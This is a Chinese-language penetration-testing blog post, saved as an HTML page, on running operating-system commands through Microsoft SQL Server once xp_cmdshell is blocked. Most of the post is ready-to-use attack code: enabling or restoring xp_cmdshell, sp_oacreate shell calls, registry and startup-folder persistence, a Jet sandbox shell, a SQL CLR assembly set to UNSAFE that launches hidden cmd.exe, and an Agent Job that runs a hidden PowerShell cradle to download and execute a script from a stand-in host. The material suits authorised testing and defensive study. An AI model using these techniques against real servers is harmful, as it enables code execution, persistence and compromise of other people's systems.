@@ -1,0 +1,1677 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+
+
+
+
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.7.0">
+
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "198a1f28"
+    });
+  daovoice('update');
+  </script>
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: true,
+    lazyload: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x00 简介渗透测试过程中，大家经常会碰到通过MSSQL来进行提权或执行系统命令之类的操作，通常我们经常会使用xp_cmdshell来进行执行系统命令，但是当xp_cmdshell不能使用的时候，我们还有什么别的方式么？本文将介绍与分享一下我自己学到的一些姿势。 0x01 常用的一些姿势">
+<meta name="keywords" content="mssql,exec command">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Exec OS Command Via MSSQL">
+<meta property="og:url" content="https://evi1cg.github.io/archives/Exec_OS_Command_Via_MSSQL.html">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:description" content="0x00 简介渗透测试过程中，大家经常会碰到通过MSSQL来进行提权或执行系统命令之类的操作，通常我们经常会使用xp_cmdshell来进行执行系统命令，但是当xp_cmdshell不能使用的时候，我们还有什么别的方式么？本文将介绍与分享一下我自己学到的一些姿势。 0x01 常用的一些姿势">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/1149334893.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/1328622450.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/402548703.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/2309695388.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/317503903.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/317503903.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/2911012360.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/1785045731.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/4117272108.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/3889886914.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/1131735677.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/2291071196.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/1217107479.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/02/2171763907.png">
+<meta property="og:updated_time" content="2019-01-15T05:43:36.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Exec OS Command Via MSSQL">
+<meta name="twitter:description" content="0x00 简介渗透测试过程中，大家经常会碰到通过MSSQL来进行提权或执行系统命令之类的操作，通常我们经常会使用xp_cmdshell来进行执行系统命令，但是当xp_cmdshell不能使用的时候，我们还有什么别的方式么？本文将介绍与分享一下我自己学到的一些姿势。 0x01 常用的一些姿势">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2017/02/1149334893.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evi1cg's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://evi1cg.github.io/archives/Exec_OS_Command_Via_MSSQL.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Exec OS Command Via MSSQL | Evi1cg's blog</title>
+  
+
+
+
+
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-132188022-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-132188022-1');
+  </script>
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</head>
+
+<body itemscope="" itemtype="https://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="https://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evi1cg's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档 menu-item-active">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archive" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-工具">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools" rel="section"><i class="menu-item-icon fa fa-fw fa-briefcase"></i> <br>工具</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-友链">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/friends" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i> <br>友链</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Exec_OS_Command_Via_MSSQL.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Exec OS Command Via MSSQL
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2017-02-14 07:01:00" itemprop="dateCreated datePublished" datetime="2017-02-14T07:01:00+08:00">2017-02-14</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/奇技淫巧/" itemprop="url" rel="index"><span itemprop="name">奇技淫巧</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/archives/Exec_OS_Command_Via_MSSQL.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/Exec_OS_Command_Via_MSSQL.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <!-- index-menu -->
+<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>渗透测试过程中，大家经常会碰到通过MSSQL来进行提权或执行系统命令之类的操作，通常我们经常会使用xp_cmdshell来进行执行系统命令，但是当xp_cmdshell不能使用的时候，我们还有什么别的方式么？本文将介绍与分享一下我自己学到的一些姿势。</p>
+<h2 id="0x01-常用的一些姿势"><a href="#0x01-常用的一些姿势" class="headerlink" title="0x01 常用的一些姿势"></a>0x01 常用的一些姿势</h2><a id="more"></a>
+<h3 id="1-XP-CMDSHELL"><a href="#1-XP-CMDSHELL" class="headerlink" title="1. XP_CMDSHELL"></a>1. XP_CMDSHELL</h3><p>这个大家都比较熟悉了，通过xp_cmdshell来执行命令，可使用以下语句来执行:<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">exec</span></span> master..xp_cmdshell <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure></p>
+<p>默认情况下xp_cmdshell 是禁止的，如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/1149334893.png" alt="1486692934805.png"></p>
+<p>这个时候，可以使用以下命令进行开启：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">EXEC</span> sp_configure <span class="string">'show advanced options'</span>, <span class="number">1</span>;RECONFIGURE;<span class="built_in">EXEC</span> sp_configure <span class="string">'xp_cmdshell'</span>, <span class="number">1</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
+<p>关闭一样,只是将上面的后面的那个”1”改成”0”就可以了。<br>开启以后，则可执行系统命令</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/1328622450.png" alt="1486693092394.png"></p>
+<p>如果xp_cmdshell被删除，可以尝试上传xplog70.dll进行恢复，恢复语句：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master<span class="selector-class">.dbo</span><span class="selector-class">.sp_addextendedproc</span> <span class="string">'xp_cmdshell'</span>,<span class="string">'D:\\xplog70.dll'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2-SP-OACREATE"><a href="#2-SP-OACREATE" class="headerlink" title="2. SP_OACREATE"></a>2. SP_OACREATE</h3><p>当xp_cmdshell 删除以后，可以使用SP_OACreate。<br>首先要打开组件：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">EXEC</span> sp_configure <span class="string">'show advanced options'</span>, <span class="number">1</span>;   </span><br><span class="line"><span class="attribute">RECONFIGURE</span> WITH OVERRIDE;   </span><br><span class="line"><span class="attribute">EXEC</span> sp_configure <span class="string">'Ole Automation Procedures'</span>, <span class="number">1</span>;   </span><br><span class="line"><span class="attribute">RECONFIGURE</span> WITH OVERRIDE;   </span><br><span class="line"><span class="attribute">EXEC</span> sp_configure <span class="string">'show advanced options'</span>, <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
+<p>之后使用以下语句执行命令：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="meta">@shell</span> <span class="keyword">int</span> exec sp_oacreate <span class="string">'wscript.shell'</span>,<span class="meta">@shell</span> output exec sp_oamethod <span class="meta">@shell</span>,<span class="string">'run'</span>,<span class="keyword">null</span>,<span class="string">'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt'</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这里要注意一下，此方式执行是无回显的</p>
+</blockquote>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/402548703.png" alt="1486693761102.png"></p>
+<h3 id="3-自启动"><a href="#3-自启动" class="headerlink" title="3. 自启动"></a>3. 自启动</h3><p>以下方式需要电脑重启。<br>添加注册表：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">xp_regwrite</span> <span class="string">'HKEY_LOCAL_MACHINE'</span>,<span class="string">'SOFTWARE\Microsoft\Windows\currentversion\run'</span>,<span class="string">'exec'</span>,<span class="string">'REG_SZ'</span>,<span class="string">'ipconfig'</span></span><br></pre></td></tr></table></figure></p>
+<p>备份添加启动项：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> <span class="keyword">test</span> <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span><span class="comment">-- (把SQL设置成日志完全恢复模式)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a image)<span class="comment">--  (新建立一个cmd表)</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">database</span> <span class="keyword">test</span>  <span class="keyword">to</span> disk = <span class="string">'D:\\temp\\cmd'</span>  <span class="keyword">WITH</span> init <span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> <span class="keyword">test</span> <span class="keyword">to</span> disk = <span class="string">'D:\\temp\\cmd1'</span>  <span class="keyword">WITH</span> init <span class="comment">--  (减少备分数据的大小)</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="number">0x0a406563686f206f66660d0a406563686f206f66660d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a400d0a40</span>)</span><br><span class="line"><span class="comment">-- (插入cmd命令)</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> <span class="keyword">test</span> <span class="keyword">to</span> disk = <span class="string">'C:\\Documents and Settings\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1.bat'</span><span class="comment">-- (备分日志到启动路径）</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> cmd <span class="comment">--(删除新建的cmd表）</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> <span class="keyword">test</span> <span class="keyword">set</span> <span class="keyword">RECOVERY</span> SIMPLE<span class="comment">--(把SQL设置成日志简单恢复模式)</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>测试发现，Win10+MSSQL 2012导出的批处理并不能顺利执行，可能与系统及数据库版本有一定关系，成功率并不怎么高。</p>
+</blockquote>
+<h3 id="4-通过沙盒执行命令"><a href="#4-通过沙盒执行命令" class="headerlink" title="4. 通过沙盒执行命令"></a>4. 通过沙盒执行命令</h3><p>开启沙盒：<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">exec</span></span> master..xp_regwrite <span class="string">'HKEY_LOCAL_MACHINE'</span>,<span class="string">'SOFTWARE\Microsoft\Jet\4.0\Engines'</span>,<span class="string">'SandBoxMode'</span>,<span class="string">'REG_DWORD'</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>然后利用jet.oledb执行命令：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from openrowset(<span class="symbol">'microsoft.jet.oledb.4.0</span><span class="string">','</span>;database=c:\windows\system32\ias\dnary.mdb<span class="string">','</span><span class="keyword">select</span> shell(<span class="string">"whoami"</span>)')</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-通过Agent-Job执行命令"><a href="#0x02-通过Agent-Job执行命令" class="headerlink" title="0x02 通过Agent Job执行命令"></a>0x02 通过Agent Job执行命令</h2><p>此种方式适用于服务器<code>开启了MSSQL Agent Job服务</code>，并且服务器中<code>当前运行的用户账号拥有足够的权限去创建并执行代理作业</code>的情况。<br>利用代码如下：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">USE</span> msdb; <span class="attribute">EXEC</span> dbo.sp_add_job <span class="variable">@job_name</span> = N<span class="string">'test_powershell_job1'</span> ; <span class="attribute">EXEC</span> sp_add_jobstep <span class="variable">@job_name</span> = N<span class="string">'test_powershell_job1'</span>, <span class="variable">@step_name</span> = N<span class="string">'test_powershell_name1'</span>, <span class="variable">@subsystem</span> = N<span class="string">'PowerShell'</span>, <span class="variable">@command</span> = N<span class="string">'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('</span><span class="string">'http://IP_OR_HOSTNAME/file'</span><span class="string">'))"'</span>, <span class="variable">@retry_attempts</span> = <span class="number">1</span>, <span class="variable">@retry_interval</span> = <span class="number">5</span> ;<span class="attribute">EXEC</span> dbo.sp_add_jobserver <span class="variable">@job_name</span> = N<span class="string">'test_powershell_job1'</span>; <span class="attribute">EXEC</span> dbo.sp_start_job N<span class="string">'test_powershell_job1'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>关于此种方式已经有文章进行介绍，有兴趣可以阅读一下。<a href="http://bobao.360.cn/learning/detail/3070.html" target="_blank" rel="noopener">戳我</a></p>
+<h2 id="0x03-SQL-Server-CLR"><a href="#0x03-SQL-Server-CLR" class="headerlink" title="0x03 SQL Server CLR"></a>0x03 SQL Server CLR</h2><p>这种方式是最近才学到的，也是本文重点介绍的一种姿势。<br>Microsoft SQL Server 现在具备与 Microsoft Windows .NET Framework 的公共语言运行时 (CLR) 组件集成的功能。CLR 为托管代码提供服务，例如跨语言集成、代码访问安全性、对象生存期管理以及调试和分析支持。对于 SQL Server 用户和应用程序开发人员来说，CLR 集成意味着您现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）编写存储过程、触发器、用户定义类型、用户定义函数（标量函数和表值函数）以及用户定义的聚合函数。<br>要通过此种方式来执行命令，也有几个前提：<br>1、<code>在SQL Server上能启用CLR并可以创建自定义存储过程</code><br>2、<code>SQL Server当前账号具有执行命令/代码所需要的权限</code><br>创建CLR有两种方式:<br>方式一：使用DLL文件进行创建<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ASSEMBLY</span> AssemblyName <span class="keyword">from</span> ‘DLLPath’</span><br></pre></td></tr></table></figure></p>
+<p>方式二：使用文件16进制流进行创建<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ASSEMBLY</span> AssemblyName <span class="keyword">from</span> 文件十六进制流</span><br></pre></td></tr></table></figure></p>
+<p>对于做渗透的我们，当然是没有文件是最好的方式了，因此，本文主要介绍方式二。以下为详细测试步骤：<br>1、安装Visual Studio和SQL Server数据库，此次测试使用了VS2015跟SQL2012。<br>2、创建一个新的SQL Server数据库项目</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/2309695388.png" alt="1486707809346.png"></p>
+<p>3、设置项目属性，目标平台修改为需要的目标平台，如SQL Server 2012; <code>将SQLCLR权限级别修改为UNSAFE</code>；修改.Net 框架版本为自己需要的版本；<code>语言选择C#</code>。</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/317503903.png" alt="1486708114728.png"></p>
+<p>4、右键项目，选择添加-&gt;新建项，新建SQL CLR C# 存储过程</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/317503903.png" alt="1486708114728.png"></p>
+<p>5、填入以下测试代码：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Data.SqlClient;</span><br><span class="line"><span class="keyword">using</span> System.Data.SqlTypes;</span><br><span class="line"><span class="keyword">using</span> Microsoft.SqlServer.<span class="built_in">Server</span>;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.<span class="built_in">Server</span>.SqlProcedure]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> SqlStoredProcedure1 ()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在此处放置代码</span></span><br><span class="line">        System.Diagnostics.<span class="built_in">Process</span> <span class="built_in">process</span> = <span class="keyword">new</span> System.Diagnostics.<span class="built_in">Process</span>();</span><br><span class="line">        <span class="built_in">process</span>.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;</span><br><span class="line">        <span class="built_in">process</span>.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line">        <span class="built_in">process</span>.StartInfo.Arguments = <span class="string">"/C whoami &gt; d:\\temp\\1.txt"</span>;</span><br><span class="line">        <span class="built_in">process</span>.Start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>6、填入代码以后进行编译，之后到编译目录下可以看到一个<code>dacpac</code>后缀的文件。</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/2911012360.png" alt="1486708723935.png"></p>
+<p>7、双击此文件进行解压，将解压出一个名为mode.sql的文件。<br>8、执行SQL文件中的以下语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ASSEMBLY</span> [ExecCode]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    <span class="keyword">FROM</span> <span class="number">0x4D5A</span>[...snip...]</span><br><span class="line">    <span class="keyword">WITH</span> PERMISSION_SET = <span class="keyword">UNSAFE</span>;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/1785045731.png" alt="1486709097438.png"></p>
+<p>之后执行：<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> [<span class="title">dbo</span>].[<span class="title">SqlStoredProcedure1</span>]</span></span><br><span class="line"><span class="function"><span class="title">AS</span> <span class="title">EXTERNAL</span> <span class="title">NAME</span> [<span class="title">ExecCode</span>].[<span class="title">StoredProcedures</span>].[<span class="title">SqlStoredProcedure1</span>]</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/4117272108.png" alt="1486709131235.png"></p>
+<p>9、开启数据库服务器配置选项clr enabled<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure N<span class="string">'show advanced options'</span>, N<span class="string">'1'</span> </span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> <span class="keyword">OVERRIDE</span></span><br><span class="line">--开启clr enabled 选项</span><br><span class="line">EXEC sp_configure N<span class="string">'clr enabled'</span>, N<span class="string">'1'</span></span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> <span class="keyword">OVERRIDE</span> </span><br><span class="line">--关闭所有服务器配置选项</span><br><span class="line">EXEC sp_configure N<span class="string">'show advanced options'</span>, N<span class="string">'0'</span> </span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> <span class="keyword">OVERRIDE</span></span><br><span class="line">--如果存在权限问题，执行下面一段脚本</span><br><span class="line">alter database [master] <span class="keyword">set</span> TRUSTWORTHY <span class="keyword">on</span></span><br><span class="line">EXEC sp_changedbowner <span class="string">'sa'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/3889886914.png" alt="1486709244073.png"></p>
+<p>10、执行命令：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC <span class="string">[dbo]</span>.<span class="string">[SqlStoredProcedure1]</span>;</span><br></pre></td></tr></table></figure></p>
